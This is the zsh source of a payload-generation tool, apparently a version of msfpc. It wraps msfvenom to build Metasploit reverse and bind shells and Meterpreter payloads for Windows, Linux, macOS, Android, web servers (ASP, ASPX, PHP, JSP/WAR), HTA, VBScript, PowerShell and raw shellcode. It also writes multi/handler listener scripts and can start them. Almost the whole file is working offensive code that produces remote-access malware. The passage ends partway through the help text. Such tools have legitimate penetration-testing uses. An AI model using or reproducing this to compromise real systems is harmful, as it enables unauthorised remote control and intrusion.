#!/bin/zsh

# Enable zsh options for bash compatibility
setopt KSH_ARRAYS        # Use 0-based array indexing like bash
setopt BASH_REMATCH      # Enable BASH_REMATCH for regex matching
setopt SH_WORD_SPLIT     # Enable word splitting like bash
setopt ALIASES           # Enable alias expansion in scripts

#-Metadata----------------------------------------------------#
#  Filename: msfpc.sh                    (Update: 2026-02-27) #
#-Info--------------------------------------------------------#
#  Quickly generate Metasploit payloads using msfvenom.       #
#-Author(s)---------------------------------------------------#
#  g0tmilk ~ https://blog.g0tmi1k.com/                        #
#-Operating System--------------------------------------------#
#  Designed for & tested on: Kali Rolling & Metasploit v4.11+ #
#          Reported working: OSX 10.11+ & Kali Linux 1.x/2.x  #
#-Licence-----------------------------------------------------#
#  MIT License ~ http://opensource.org/licenses/MIT           #
#-Notes-------------------------------------------------------#
#  Requires:                                                  #
#    Metasploit Framework v4.11.3-2015062101 or higher        #
#                             ---                             #
#  Useful Manual Commands:                                    #
#    msfvenom --list payloads                                 #
#    msfvenom --list encoders                                 #
#    msfvenom --help-formats                                  #
#                             ---                             #
#  Reminder about payload names:                              #
#    shell_bind_tcp - Single / Inline / NonStaged / Stageless #
#    shell/bind_tcp - Staged (Requires Metasploit)            #
#-------------------------------------------------------------#

#--Quick Install----------------------------------------------#
#  curl -L "https://raw.githubusercontent.com/g0tmi1k/msfpc/master/msfpc.sh" > /usr/bin/msfpc; chmod +x /usr/bin/msfpc
#-------------------------------------------------------------#

#-More information--------------------------------------------#
#   - https://www.offensive-security.com/metasploit-unleashed/payloads/
#   - https://www.offensive-security.com/metasploit-unleashed/payload-types/
#   - https://www.offensive-security.com/metasploit-unleashed/msfvenom/
#   - https://community.rapid7.com/community/metasploit/blog/2015/03/25/stageless-meterpreter-payloads
#   - https://community.rapid7.com/community/metasploit/blog/2011/05/24/introducing-msfvenom
#   - https://community.rapid7.com/community/metasploit/blog/2014/12/09/good-bye-msfpayload-and-msfencode
#   - https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom
#-------------------------------------------------------------#


#-Defaults----------------------------------------------------#


##### Version
VERSION="1.5.0"

##### Script name (zsh $0 inside functions returns the function name, not the script)
SCRIPTNAME="${0}"

##### Variables
OUTPATH="$( pwd )/"      # Others: ./   /tmp/   /var/www/

##### (Cosmetic) Colour output
RED="\033[01;31m"      # Issues/Errors
GREEN="\033[01;32m"    # Success/Asking for Input
YELLOW="\033[01;33m"   # Warnings/Information
BLUE="\033[01;34m"     # Heading
BOLD="\033[01;01m"     # Highlight
RESET="\033[00m"       # Normal

##### User-configurable options
TYPE=""
IP=""
PORT=""
SHELL=""
DIRECTION=""
STAGE=""
_STAGE=""
METHOD=""
VERBOSE=false
ARCH=""
RCONLY=false
ENCODER=""
ITERATIONS=""
OUTFORMAT=""
DRYRUN=false
LISTEN=false

##### Default values
SUCCESS=false
DOMAIN=false
BATCH=false
LOOP=false
HELP=false
DARWIN=false

##### Temp file (set by mktemp at runtime)
TMPFILE=""

##### (Optional) Enable debug mode?
#set -x


#-Config File-------------------------------------------------#

CONFIGFILE="${HOME}/.msfpcrc"
if [[ -f "${CONFIGFILE}" ]]; then
  while IFS='=' read -r _cfg_key _cfg_val; do
    _cfg_key="$( echo "${_cfg_key}" | tr -d '[:space:]' )"
    _cfg_val="$( echo "${_cfg_val}" | tr -d '[:space:]' | tr -d '"' | tr -d "'" )"
    [[ -z "${_cfg_key}" || "${_cfg_key}" == \#* ]] && continue
    case "${_cfg_key}" in
      port)       [[ -z "${PORT}" ]]      && PORT="${_cfg_val}" ;;
      method)     [[ -z "${METHOD}" ]]    && METHOD="${_cfg_val}" ;;
      direction)  [[ -z "${DIRECTION}" ]] && DIRECTION="${_cfg_val}" ;;
      arch)       [[ -z "${ARCH}" ]]      && ARCH="${_cfg_val}" ;;
      shell)      [[ -z "${SHELL}" ]]     && SHELL="${_cfg_val}" ;;
      stage)      [[ -z "${STAGE}" ]]     && STAGE="${_cfg_val}" ;;
      encoder)    [[ -z "${ENCODER}" ]]   && ENCODER="${_cfg_val}" ;;
      iterations) [[ -z "${ITERATIONS}" ]] && ITERATIONS="${_cfg_val}" ;;
      outpath)    OUTPATH="${_cfg_val%/}/" ;;
      verbose)    [[ "${_cfg_val}" == "true" ]] && VERBOSE=true ;;
    esac
  done < "${CONFIGFILE}"
fi


#-Functions---------------------------------------------------#


## Cleanup temp files on exit
function cleanup {
  [[ -n "${TMPFILE}" && -f "${TMPFILE}" ]] && \rm -f "${TMPFILE}"
}
trap cleanup EXIT


## doAction — execute msfvenom (via MSFVENOM_ARGS array) and create handler .rc file
## Arguments: TYPE IP PORT PAYLOAD CMD_DISPLAY FILEEXT SHELL DIRECTION STAGE METHOD VERBOSE ARCH
function doAction {
  local _TYPE="${1}" _IP="${2}" _PORT="${3}" _PAYLOAD="${4}" _CMD_DISPLAY="${5}"
  local _FILEEXT="${6%-service}" _SHELL="${7}" _DIRECTION="${8}" _STAGE="${9}"
  local _METHOD="${10}" _VERBOSE="${11}" _DA_ARCH="${12:-x86}"
  local PADDING=""

  if [[ -z "${_VERBOSE}" ]]; then
    echo -e " ${YELLOW}[i]${RESET} ${RED}Something went wrong (Internally)${RESET}: doAction TYPE(${_TYPE}) IP(${_IP}) PORT(${_PORT}) PAYLOAD(${_PAYLOAD}) FILEEXT(${_FILEEXT}) SHELL(${_SHELL}) DIRECTION(${_DIRECTION}) STAGE(${_STAGE}) METHOD(${_METHOD}) VERBOSE(${_VERBOSE})" >&2
    return 2
  fi

  local _FNAME_ARCH=""
  [[ "${_DA_ARCH}" == "x64" || "${_DA_ARCH}" == "aarch64" ]] && _FNAME_ARCH="${_DA_ARCH}-"
  local FILENAME="${OUTPATH}${_TYPE}-${_FNAME_ARCH}${_SHELL}-${_STAGE}-${_DIRECTION}-${_METHOD}-${_PORT}.${_FILEEXT}"
  local FILEHANDLE="${OUTPATH}${_TYPE}-${_FNAME_ARCH}${_SHELL}-${_STAGE}-${_DIRECTION}-${_METHOD}-${_PORT}-${_FILEEXT}.rc"

  local X="  IP"
  [[ "${DOMAIN}" == "true" ]] && X='NAME'
  [[ "${_VERBOSE}" == "true" ]] && PADDING='     '

  echo -e " ${YELLOW}[i]${RESET}${PADDING} ${X}: ${YELLOW}${_IP}${RESET}"
  echo -e " ${YELLOW}[i]${RESET}${PADDING} PORT: ${YELLOW}${_PORT}${RESET}"
  echo -e " ${YELLOW}[i]${RESET}${PADDING} TYPE: ${YELLOW}${_TYPE}${RESET} (${_PAYLOAD})"
  if [[ "${_VERBOSE}" == "true" ]]; then
    echo -e " ${YELLOW}[i]${RESET}     SHELL: ${YELLOW}${_SHELL}${RESET}"
    echo -e " ${YELLOW}[i]${RESET} DIRECTION: ${YELLOW}${_DIRECTION}${RESET}"
    echo -e " ${YELLOW}[i]${RESET}     STAGE: ${YELLOW}${_STAGE}${RESET}"
    echo -e " ${YELLOW}[i]${RESET}    METHOD: ${YELLOW}${_METHOD}${RESET}"
    [[ -n "${ENCODER}" && "${ENCODER}" != "generic/none" ]] \
      && echo -e " ${YELLOW}[i]${RESET}   ENCODER: ${YELLOW}${ENCODER}${RESET}"
    [[ -n "${ITERATIONS}" ]] \
      && echo -e " ${YELLOW}[i]${RESET}     ITERS: ${YELLOW}${ITERATIONS}${RESET}"
  fi
  echo -e " ${YELLOW}[i]${RESET}${PADDING}  CMD: ${BOLD}${_CMD_DISPLAY}${RESET}"
  echo ""

  ## Dry-run mode — print command only, skip execution
  if [[ "${DRYRUN}" == "true" ]]; then
    echo -e " ${GREEN}[i]${RESET} ${BOLD}Dry-run mode${RESET} — command printed above, nothing executed"
    echo ""
    SUCCESS=true
    return 0
  fi

  ## Handler-only mode — skip msfvenom, generate .rc only
  if [[ "${RCONLY}" == "true" ]]; then
    echo -e " ${GREEN}[i]${RESET} ${BOLD}Handler-only mode${RESET} — skipping payload generation (msfvenom not called)"
    echo ""
  else
    [[ -e "${FILENAME}" ]] \
      && echo -e " ${YELLOW}[i]${RESET} File (${FILENAME}) ${YELLOW}already exists${RESET}. ${YELLOW}Overwriting...${RESET}" \
      && rm -f "${FILENAME}"

    ## Execute msfvenom directly using array (no eval)
    TMPFILE="$( mktemp /tmp/msfpc.XXXXXX )"
    msfvenom "${MSFVENOM_ARGS[@]}" > "${FILENAME}" 2>"${TMPFILE}"

    [[ ! -s "${FILENAME}" ]] \
      && rm -f "${FILENAME}"
    if [[ -e "${FILENAME}" ]]; then
      echo -e " ${YELLOW}[i]${RESET} ${_TYPE} ${_SHELL} created: '${YELLOW}${FILENAME}${RESET}'"
      echo ""
      \chmod +x "${FILENAME}"
    else
      echo ""
      if \grep -q 'Invalid Payload Selected' "${TMPFILE}" 2>/dev/null; then
        echo -e "\n ${YELLOW}[i]${RESET} ${RED}Invalid Payload Selected${RESET} (Metasploit doesn't support this) =(" >&2
      else
        echo -e "\n ${YELLOW}[i]${RESET} Something went wrong. ${RED}Issue creating file${RESET} =(." >&2
        echo -e "\n----------------------------------------------------------------------------------------"
        [ -e "/usr/share/metasploit-framework/build_rev.txt" ] \
          && \cat /usr/share/metasploit-framework/build_rev.txt \
          || \msfconsole -v
        \uname -a
        echo -e "----------------------------------------------------------------------------------------${RED}"
        \cat "${TMPFILE}"
        echo -e "${RESET}----------------------------------------------------------------------------------------\n"
      fi
      \rm -f "${TMPFILE}"
      return 1
    fi
    \rm -f "${TMPFILE}"

    if [[ "${_VERBOSE}" == "true" ]]; then
      echo -e " ${YELLOW}[i]${RESET} File: $( \file -b "${FILENAME}" )"
      echo -e " ${YELLOW}[i]${RESET} Size: $( \du -h "${FILENAME}" | \cut -f1 )"
      echo -e " ${YELLOW}[i]${RESET}  MD5: $( \openssl md5 "${FILENAME}" | \awk '{print $2}' )"
      echo -e " ${YELLOW}[i]${RESET} SHA1: $( \openssl sha1 "${FILENAME}" | \awk '{print $2}' )"
      echo -e ""
    fi
  fi

  ## Generate handler .rc file
  local HOST="LHOST"
  [[ "${_DIRECTION}" == "bind" ]] \
    && HOST="RHOST"

  cat <<EOF > "${FILEHANDLE}"
#
# [Kali]: msfdb start; msfconsole -q -r '${FILEHANDLE}'
#
use exploit/multi/handler
set PAYLOAD ${_PAYLOAD}
set ${HOST} ${_IP}
set LPORT ${_PORT}
set ExitOnSession false
set EnableStageEncoding true
#set AutoRunScript 'post/windows/manage/migrate'
run -j
EOF

  echo -e " ${YELLOW}[i]${RESET} MSF handler file: '${FILEHANDLE}'"
  echo -e " ${YELLOW}[i]${RESET} Run: msfconsole -q -r '${FILEHANDLE}'"
  SUCCESS=true

  ## Auto-start handler
  if [[ "${LISTEN}" == "true" && "${RCONLY}" != "true" ]]; then
    echo -e "\n ${GREEN}[*]${RESET} ${BOLD}Starting handler...${RESET}"
    msfconsole -q -r "${FILEHANDLE}"
  fi

  return 0
}


## generatePayload — determine type-specific config, build MSFVENOM_ARGS, call doAction
## Reads globals: TYPE, IP, PORT, SHELL, DIRECTION, STAGE, _STAGE, METHOD, VERBOSE, ARCH
##                ENCODER, ITERATIONS, OUTFORMAT, DRYRUN, RCONLY, LISTEN, DOMAIN, OUTPATH
function generatePayload {
  local _SHELL="${SHELL}"
  local _STAGE="${STAGE}"
  local __STAGE="${_STAGE}"      # "/" or "_" separator for payload path
  local _METHOD="${METHOD}"
  local _DIRECTION="${DIRECTION}"
  local _ARCH="${ARCH}"

  ## Apply defaults for empty values
  [[ -z "${_METHOD}" ]]    && _METHOD="tcp"
  [[ -z "${_DIRECTION}" ]] && _DIRECTION="reverse"
  [[ -z "${_ARCH}" ]]      && _ARCH="x86"

  ## Architecture path helpers
  local _ARCHVAL="${_ARCH}"
  local _ARCH_INSERT=""
  [[ "${_ARCH}" == "x64" ]]     && _ARCH_INSERT="x64/"
  [[ "${_ARCH}" == "aarch64" ]] && _ARCH_INSERT="aarch64/"

  ## Validation: shell
  if [[ -n "${_SHELL}" && "${_SHELL}" != "shell" && "${_SHELL}" != "meterpreter" ]]; then
    echo -e " ${YELLOW}[i]${RESET} SHELL (${_SHELL}) is incorrect. Needs to be either ${YELLOW}shell${RESET} or ${YELLOW}meterpreter${RESET}" >&2
    return 1
  fi

  ## Validation: stage
  if [[ -n "${_STAGE}" && "${_STAGE}" != "staged" && "${_STAGE}" != "stageless" ]]; then
    echo -e " ${YELLOW}[i]${RESET} STAGED (${_STAGE}) is incorrect. Needs to be either ${YELLOW}staged${RESET} or ${YELLOW}stageless${RESET}" >&2
    return 1
  fi

  ## Validation: bind only works with tcp
  if [[ "${_DIRECTION}" != "reverse" && "${_METHOD}" != "tcp" ]]; then
    echo -e " ${YELLOW}[i]${RESET} Unable to use ${_METHOD} with ${_DIRECTION}. Please ${YELLOW}switch to reverse${RESET}" >&2
    return 1
  fi

  ## Bind shell does not use LHOST
  local _LHOST=""
  [[ "${_DIRECTION}" == "reverse" ]] && _LHOST="LHOST=${IP}"

  ## Per-type configuration
  local _TYPE="${TYPE}"
  local PAYLOAD="" FILEEXT=""
  local _msf_format="" _msf_platform="" _msf_arch="" _use_encoder=true
  local _FNAME_ARCH_TAG=""
  [[ "${_ARCH}" == "x64" || "${_ARCH}" == "aarch64" ]] && _FNAME_ARCH_TAG="${_ARCH}-"


  ## ---------- APK ----------
  if [[ "${_TYPE}" == "apk" ]]; then
    [[ -z "${_SHELL}" ]]  && _SHELL="meterpreter"
    [[ -z "${_STAGE}" ]]  && _STAGE="stageless" && __STAGE="/"
    [[ "${_METHOD}" == "find_port" ]] && _METHOD="allports"
    _TYPE="android"
    FILEEXT="apk"
    _msf_format=""  # APK uses raw stdout
    _msf_platform=""
    _msf_arch=""
    _use_encoder=false
    PAYLOAD="android/${_SHELL}${__STAGE}${_DIRECTION}_${_METHOD}"


  ## ---------- ASP ----------
  elif [[ "${_TYPE}" == "asp" ]]; then
    [[ -z "${_SHELL}" ]]  && _SHELL="meterpreter"
    [[ -z "${_STAGE}" ]]  && _STAGE="staged" && __STAGE="/"
    [[ "${_METHOD}" == "find_port" ]] && _METHOD="allports"
    if [[ "${_STAGE}" == "stageless" && "${_SHELL}" == "meterpreter" ]]; then
      echo -e " ${YELLOW}[i]${RESET} Unable to do ${_STAGE} ${_SHELL} ASP. The result is over Metasploit's ${RED}file size limit${RESET}. =(" >&2
      return 1
    fi
    [[ "${_ARCH}" == "x64" ]] \
      && echo -e " ${YELLOW}[i]${RESET} ${YELLOW}Warning${RESET}: ASP payloads may ${RED}not fully support x64${RESET}. Trying anyway..."
    _TYPE="windows"
    FILEEXT="asp"
    _msf_format="asp"
    _msf_platform="windows"
    _msf_arch="${_ARCHVAL}"
    PAYLOAD="${_TYPE}/${_ARCH_INSERT}${_SHELL}${__STAGE}${_DIRECTION}_${_METHOD}"


  ## ---------- ASPX ----------
  elif [[ "${_TYPE}" == "aspx" ]]; then
    [[ -z "${_SHELL}" ]]  && _SHELL="meterpreter"
    [[ -z "${_STAGE}" ]]  && _STAGE="staged" && __STAGE="/"
    [[ "${_METHOD}" == "find_port" ]] && _METHOD="allports"
    _TYPE="windows"
    FILEEXT="aspx"
    _msf_format="aspx"
    _msf_platform="windows"
    _msf_arch="${_ARCHVAL}"
    PAYLOAD="${_TYPE}/${_ARCH_INSERT}${_SHELL}${__STAGE}${_DIRECTION}_${_METHOD}"


  ## ---------- Bash ----------
  elif [[ "${_TYPE}" == "bash" || "${_TYPE}" == "sh" ]]; then
    [[ -z "${_SHELL}" ]]  && _SHELL="shell"
    [[ -z "${_STAGE}" ]]  && _STAGE="staged" && __STAGE="/"
    if [[ "${_STAGE}" == "stageless" ]]; then
      echo -e " ${YELLOW}[i]${RESET} Unable to do ${_STAGE}. There ${RED}isn't an option in Metasploit to allow it${RESET}. =(" >&2
      return 1
    elif [[ "${_SHELL}" == "meterpreter" ]]; then
      echo -e " ${YELLOW}[i]${RESET} Unable to do ${_SHELL} Bash. There ${RED}isn't a Bash ${_SHELL}${RESET}...yet?" >&2
      return 1
    elif [[ "${_DIRECTION}" != "reverse" ]]; then
      echo -e " ${YELLOW}[i]${RESET} Unable to do ${_DIRECTION}. There ${RED}isn't a ${_DIRECTION} Bash${RESET}...yet?" >&2
      return 1
    fi
    _TYPE="bash"
    FILEEXT="sh"
    _FNAME_ARCH_TAG=""
    _msf_format="raw"
    _msf_platform="unix"
    _msf_arch="cmd"
    PAYLOAD="cmd/unix${__STAGE}${_DIRECTION}_bash"


  ## ---------- C# ----------
  elif [[ "${_TYPE}" == "csharp" || "${_TYPE}" == "cs" ]]; then
    [[ -z "${_SHELL}" ]]  && _SHELL="meterpreter"
    [[ -z "${_STAGE}" ]]  && _STAGE="staged" && __STAGE="/"
    [[ "${_METHOD}" == "find_port" ]] && _METHOD="allports"
    _TYPE="windows"
    FILEEXT="cs"
    _msf_format="csharp"
    _msf_platform="windows"
    _msf_arch="${_ARCHVAL}"
    PAYLOAD="${_TYPE}/${_ARCH_INSERT}${_SHELL}${__STAGE}${_DIRECTION}_${_METHOD}"


  ## ---------- HTA ----------
  elif [[ "${_TYPE}" == "hta" ]]; then
    [[ -z "${_SHELL}" ]]  && _SHELL="meterpreter"
    [[ -z "${_STAGE}" ]]  && _STAGE="staged" && __STAGE="/"
    [[ "${_METHOD}" == "find_port" ]] && _METHOD="allports"
    _TYPE="windows"
    FILEEXT="hta"
    _msf_format="hta-psh"
    _msf_platform="windows"
    _msf_arch="${_ARCHVAL}"
    PAYLOAD="${_TYPE}/${_ARCH_INSERT}${_SHELL}${__STAGE}${_DIRECTION}_${_METHOD}"


  ## ---------- Java ----------
  elif [[ "${_TYPE}" == "java" || "${_TYPE}" == "jsp" ]]; then
    [[ -z "${_SHELL}" ]]  && _SHELL="meterpreter"
    [[ -z "${_STAGE}" ]]  && _STAGE="staged" && __STAGE="/"
    if [[ "${_STAGE}" == "stageless" && "${_SHELL}" == "meterpreter" ]]; then
      echo -e " ${YELLOW}[i]${RESET} Unable to do ${_STAGE} ${_SHELL} Java. There ${RED}isn't an option in Metasploit to allow it${RESET}. =(" >&2
      return 1
    fi
    _TYPE="java"
    FILEEXT="jsp"
    _FNAME_ARCH_TAG=""
    _msf_format="raw"
    _msf_platform="java"
    _msf_arch="java"
    PAYLOAD="${_TYPE}/${_SHELL}${__STAGE}${_DIRECTION}_${_METHOD}"


  ## ---------- Linux ----------
  elif [[ "${_TYPE}" == "linux" || "${_TYPE}" == "lin" || "${_TYPE}" == "elf" ]]; then
    [[ -z "${_SHELL}" ]]  && _SHELL="shell"
    [[ -z "${_STAGE}" ]]  && _STAGE="staged" && __STAGE="/"
    if [[ "${_STAGE}" == "stageless" && "${_SHELL}" == "meterpreter" ]]; then
      echo -e " ${YELLOW}[i]${RESET} Unable to do ${_STAGE} ${_SHELL} Linux. There ${RED}isn't an option in Metasploit to allow it${RESET}. =(" >&2
      return 1
    fi
    _TYPE="linux"
    FILEEXT="elf"
    _msf_format="elf"
    _msf_platform="linux"
    _msf_arch="${_ARCHVAL}"
    PAYLOAD="${_TYPE}/${_ARCHVAL}/${_SHELL}${__STAGE}${_DIRECTION}_${_METHOD}"


  ## ---------- OSX ----------
  elif [[ "${_TYPE}" == "osx" || "${_TYPE}" == "macho" ]]; then
    [[ -z "${_SHELL}" ]]  && _SHELL="shell"
    [[ -z "${_STAGE}" ]]  && _STAGE="stageless" && __STAGE="_"
    if [[ "${_STAGE}" == "staged" ]]; then
      echo -e " ${YELLOW}[i]${RESET} Unable to do ${_STAGE} OSX. There ${RED}isn't an option in Metasploit to allow it${RESET}. =(" >&2
      return 1
    elif [[ "${_SHELL}" == "meterpreter" ]]; then
      echo -e " ${YELLOW}[i]${RESET} Unable to do ${_SHELL} OSX. There ${RED}isn't an OSX Meterpreter${RESET}...yet." >&2
      return 1
    fi
    _TYPE="osx"
    FILEEXT="macho"
    _msf_format="macho"
    _msf_platform="osx"
    _msf_arch="${_ARCHVAL}"
    PAYLOAD="osx/${_ARCHVAL}/${_SHELL}${__STAGE}${_DIRECTION}_${_METHOD}"


  ## ---------- Perl ----------
  elif [[ "${_TYPE}" == "perl" || "${_TYPE}" == "pl" ]]; then
    [[ -z "${_SHELL}" ]]  && _SHELL="shell"
    [[ -z "${_STAGE}" ]]  && _STAGE="staged" && __STAGE="/"
    if [[ "${_STAGE}" == "stageless" ]]; then
      echo -e " ${YELLOW}[i]${RESET} Unable to do ${_STAGE} PERL. There ${RED}isn't an option in Metasploit to allow it${RESET}. =(" >&2
      return 1
    elif [[ "${_SHELL}" == "meterpreter" ]]; then
      echo -e " ${YELLOW}[i]${RESET} Unable to do ${_SHELL} PERL. There ${RED}isn't a PERL Meterpreter${RESET}...yet." >&2
      return 1
    fi
    _TYPE="linux"
    FILEEXT="pl"
    _FNAME_ARCH_TAG=""
    _msf_format="pl"
    _msf_platform="unix"
    _msf_arch="cmd"
    PAYLOAD="cmd/unix${__STAGE}${_DIRECTION}_perl"


  ## ---------- PHP ----------
  elif [[ "${_TYPE}" == "php" ]]; then
    [[ -z "${_SHELL}" ]]  && _SHELL="meterpreter"
    [[ -z "${_STAGE}" ]]  && _STAGE="staged" && __STAGE="/"
    if [[ "${_SHELL}" == "shell" ]]; then
      echo -e " ${YELLOW}[i]${RESET} Unable to do ${_SHELL} PHP. There ${RED}isn't an option in Metasploit to allow it${RESET}. =(" >&2
      return 1
    fi
    _TYPE="php"
    FILEEXT="php"
    _FNAME_ARCH_TAG=""
    _msf_format="raw"
    _msf_platform="php"
    _msf_arch="php"
    PAYLOAD="${_TYPE}/${_SHELL}${__STAGE}${_DIRECTION}_${_METHOD}"


  ## ---------- Powershell ----------
  elif [[ "${_TYPE}" == "powershell" || "${_TYPE}" == "ps1" ]]; then
    [[ -z "${_SHELL}" ]]  && _SHELL="meterpreter"
    [[ -z "${_STAGE}" ]]  && _STAGE="stageless" && __STAGE="_"
    [[ "${_METHOD}" == "find_port" ]] && _METHOD="allports"
    _TYPE="windows"
    FILEEXT="ps1"
    _msf_format="ps1"
    _msf_platform="windows"
    _msf_arch="${_ARCHVAL}"
    PAYLOAD="${_TYPE}/${_ARCH_INSERT}${_SHELL}${__STAGE}${_DIRECTION}_${_METHOD}"


  ## ---------- Python ----------
  elif [[ "${_TYPE}" == "python" || "${_TYPE}" == "py" ]]; then
    [[ -z "${_SHELL}" ]]  && _SHELL="meterpreter"
    [[ -z "${_STAGE}" ]]  && _STAGE="staged" && __STAGE="/"
    if [[ "${_STAGE}" == "staged" && "${_SHELL}" == "shell" ]]; then
      echo -e " ${YELLOW}[i]${RESET} Unable to do ${_STAGE} ${_SHELL} Python. There ${RED}isn't an option in Metasploit to allow it${RESET}. =(" >&2
      return 1
    elif [[ "${_STAGE}" == "stageless" && "${_SHELL}" == "meterpreter" ]]; then
      echo -e " ${YELLOW}[i]${RESET} Unable to do ${_STAGE} ${_SHELL} Python. There ${RED}isn't an option in Metasploit to allow it${RESET}. =(" >&2
      return 1
    elif [[ "${_STAGE}" == "stageless" && "${_DIRECTION}" == "bind" ]]; then
      echo -e " ${YELLOW}[i]${RESET} Unable to do ${_STAGE} ${_DIRECTION} Python. There ${RED}isn't an option in Metasploit to allow it${RESET}. =(" >&2
      return 1
    fi
    _TYPE="python"
    FILEEXT="py"
    _FNAME_ARCH_TAG=""
    _msf_format="raw"
    _msf_platform="python"
    _msf_arch="python"
    PAYLOAD="${_TYPE}/${_SHELL}${__STAGE}${_DIRECTION}_${_METHOD}"


  ## ---------- Raw Shellcode ----------
  elif [[ "${_TYPE}" == "raw" || "${_TYPE}" == "bin" || "${_TYPE}" == "shellcode" ]]; then
    [[ -z "${_SHELL}" ]]  && _SHELL="meterpreter"
    [[ -z "${_STAGE}" ]]  && _STAGE="staged" && __STAGE="/"
    [[ "${_METHOD}" == "find_port" ]] && _METHOD="allports"
    _TYPE="windows"
    FILEEXT="bin"
    _msf_format="raw"
    _msf_platform="windows"
    _msf_arch="${_ARCHVAL}"
    PAYLOAD="${_TYPE}/${_ARCH_INSERT}${_SHELL}${__STAGE}${_DIRECTION}_${_METHOD}"


  ## ---------- Tomcat ----------
  elif [[ "${_TYPE}" == "tomcat" || "${_TYPE}" == "war" ]]; then
    [[ -z "${_SHELL}" ]]  && _SHELL="meterpreter"
    [[ -z "${_STAGE}" ]]  && _STAGE="staged" && __STAGE="/"
    if [[ "${_STAGE}" == "stageless" && "${_SHELL}" == "meterpreter" ]]; then
      echo -e " ${YELLOW}[i]${RESET} Unable to do ${_STAGE} ${_SHELL} Tomcat. There ${RED}isn't an option in Metasploit to allow it${RESET}. =(" >&2
      return 1
    elif [[ "${_STAGE}" == "stageless" && "${_DIRECTION}" == "bind" ]]; then
      echo -e " ${YELLOW}[i]${RESET} Unable to do ${_DIRECTION} ${_STAGE} Tomcat. There ${RED}isn't an option in Metasploit to allow it${RESET}. =(" >&2
      return 1
    elif [[ "${_METHOD}" == "find_port" ]]; then
      echo -e " ${YELLOW}[i]${RESET} Unable to do ${_METHOD} Tomcat. There ${RED}isn't an option in Metasploit to allow it${RESET}. =(" >&2
      return 1
    fi
    _TYPE="tomcat"
    FILEEXT="war"
    _FNAME_ARCH_TAG=""
    _msf_format="raw"
    _msf_platform="java"
    _msf_arch="x86"
    PAYLOAD="java/${_SHELL}${__STAGE}${_DIRECTION}_${_METHOD}"


  ## ---------- VBScript ----------
  elif [[ "${_TYPE}" == "vbscript" || "${_TYPE}" == "vbs" ]]; then
    [[ -z "${_SHELL}" ]]  && _SHELL="meterpreter"
    [[ -z "${_STAGE}" ]]  && _STAGE="staged" && __STAGE="/"
    [[ "${_METHOD}" == "find_port" ]] && _METHOD="allports"
    _TYPE="windows"
    FILEEXT="vbs"
    _msf_format="vbs"
    _msf_platform="windows"
    _msf_arch="${_ARCHVAL}"
    PAYLOAD="${_TYPE}/${_ARCH_INSERT}${_SHELL}${__STAGE}${_DIRECTION}_${_METHOD}"


  ## ---------- Windows ----------
  elif [[ "${_TYPE}" == "windows" || "${_TYPE}" == "win" || "${_TYPE}" == "exe" || "${_TYPE}" == "dll" || "${_TYPE}" == "srv" || "${_TYPE}" == "exe-service" ]]; then
    [[ -z "${_SHELL}" ]]  && _SHELL="meterpreter"
    [[ -z "${_STAGE}" ]]  && _STAGE="staged" && __STAGE="/"
    [[ "${_METHOD}" == "find_port" ]] && _METHOD="allports"
    FILEEXT="exe"
    [[ "${_TYPE}" == "dll" ]]         && FILEEXT="dll"
    [[ "${_TYPE}" == "srv" || "${_TYPE}" == "exe-service" ]] && FILEEXT="exe-service"
    _TYPE="windows"
    _msf_format="${FILEEXT}"
    _msf_platform="windows"
    _msf_arch="${_ARCHVAL}"
    PAYLOAD="${_TYPE}/${_ARCH_INSERT}${_SHELL}${__STAGE}${_DIRECTION}_${_METHOD}"


  ## ---------- Unknown type ----------
  else
    echo -e "\n ${YELLOW}[i]${RESET} Unknown type: ${YELLOW}${TYPE}${RESET}" >&2
    return 1
  fi


  ## Build MSFVENOM_ARGS array (no eval — direct execution)
  MSFVENOM_ARGS=(-p "${PAYLOAD}")

  if [[ -n "${OUTFORMAT}" ]]; then
    MSFVENOM_ARGS+=(-f "${OUTFORMAT}")
  elif [[ -n "${_msf_format}" ]]; then
    MSFVENOM_ARGS+=(-f "${_msf_format}")
  fi

  [[ -n "${_msf_platform}" ]] && MSFVENOM_ARGS+=(--platform "${_msf_platform}")
  [[ -n "${_msf_arch}" ]]     && MSFVENOM_ARGS+=(-a "${_msf_arch}")

  if [[ "${_use_encoder}" == true ]]; then
    if [[ -n "${ENCODER}" ]]; then
      MSFVENOM_ARGS+=(-e "${ENCODER}")
    else
      MSFVENOM_ARGS+=(-e generic/none)
    fi
    [[ -n "${ITERATIONS}" ]] && MSFVENOM_ARGS+=(-i "${ITERATIONS}")
  fi

  [[ -n "${_LHOST}" ]] && MSFVENOM_ARGS+=("${_LHOST}")
  MSFVENOM_ARGS+=("LPORT=${PORT}")

  ## Build display string from args
  local _CMD_DISPLAY="msfvenom"
  local _arg
  for _arg in "${MSFVENOM_ARGS[@]}"; do
    _CMD_DISPLAY="${_CMD_DISPLAY} ${_arg}"
  done

  ## Compute output filename for display
  local _out_fileext="${FILEEXT%-service}"
  local _display_file="${OUTPATH}${_TYPE}-${_FNAME_ARCH_TAG}${_SHELL}-${_STAGE}-${_DIRECTION}-${_METHOD}-${PORT}.${_out_fileext}"
  _CMD_DISPLAY="${_CMD_DISPLAY} > '${_display_file}'"

  ## Call doAction
  doAction "${_TYPE}" "${IP}" "${PORT}" "${PAYLOAD}" "${_CMD_DISPLAY}" "${FILEEXT}" "${_SHELL}" "${_DIRECTION}" "${_STAGE}" "${_METHOD}" "${VERBOSE}" "${_ARCH}"
}


## doHelp — display usage information
function doHelp {
  echo -e "\n ${BLUE}${SCRIPTNAME}${RESET} <${BOLD}TYPE${RESET}> (<${BOLD}DOMAIN/IP${RESET}>) (<${BOLD}PORT${RESET}>) (<${BOLD}CMD/MSF${RESET}>) (<${BOLD}BIND/REVERSE${RESET}>) (<${BOLD}STAGED/STAGELESS${RESET}>) (<${BOLD}TCP/HTTP/HTTPS/FIND_PORT${RESET}>) (<${BOLD}BATCH/LOOP${RESET}>) (<${BOLD}VERBOSE${RESET}>)"
  echo -e "   Example: ${BLUE}${SCRIPTNAME} windows 192.168.1.10${RESET}        # Windows & manual IP."
  echo -e "            ${BLUE}${SCRIPTNAME} elf bind eth0 4444${RESET}          # Linux, eth0's IP & manual port."
  echo -e "            ${BLUE}${SCRIPTNAME} stageless cmd py https${RESET}      # Python, stageless command prompt."
  echo -e "            ${BLUE}${SCRIPTNAME} verbose loop eth1${RESET}           # A payload for every type, using eth1's IP."
  echo -e "            ${BLUE}${SCRIPTNAME} msf batch wan${RESET}               # All possible Meterpreter payloads, using WAN IP."
